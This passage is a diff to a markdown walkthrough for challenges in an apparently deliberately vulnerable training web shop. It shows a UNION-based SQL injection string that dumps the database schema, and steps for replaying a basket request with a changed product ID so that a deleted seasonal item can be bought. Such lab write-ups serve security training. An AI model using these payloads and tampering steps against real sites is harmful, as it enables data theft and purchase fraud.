@@ -323,3 +323,34 @@ You should get this error in the response:
 ```
 In order for a union query to compile, both result tables must have the same number of columns with the same datatypes. Try adding dummy columns until this query compiles:
 `q=')) UNION SELECT sql, 1, 2, 3, 4, 5, 6, 7, 8 FROM sqlite_master;--` --> URL Encode --> `q='))%20UNION%20SELECT%20sql,%201,%202,%203,%204,%205,%206,%207,%208%20FROM%20sqlite_master;--`
+### 3. Christmas Special
+The response from the previous problem should have returned all the products from the database, including the 2014 Christmas special. Look for this entry in the JSON:
+```
+{
+ "id":10,
+ "name":"Christmas Super-Surprise-Box (2014 Edition)",
+ "description":"Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)",
+ "price":29.99,"deluxePrice":29.99,
+ "image":"undefined.jpg",
+ "createdAt":"2025-03-13 00:19:28.789 +00:00",
+ "updatedAt":"2025-03-13 00:19:28.789 +00:00",
+ "deletedAt":"2025-03-13 00:19:28.812 +00:00"
+},
+```
+Note that the `id` is `10`. Next, add any product to the basket using the UI. Inspect the network traffic to find the corresponding POST request, the body will look similar to this:
+```
+{
+ "ProductId":1,
+ "BasketId":"6",
+ "quantity":1
+}
+```
+Replace the `id` with that of the Christmas Special and then repeat the request:
+```
+{
+ "ProductId":10,
+ "BasketId":"6",
+ "quantity":1
+}
+```
+Refresh the page to see the item in your basket. Complete the checkout process to solve the challenge.
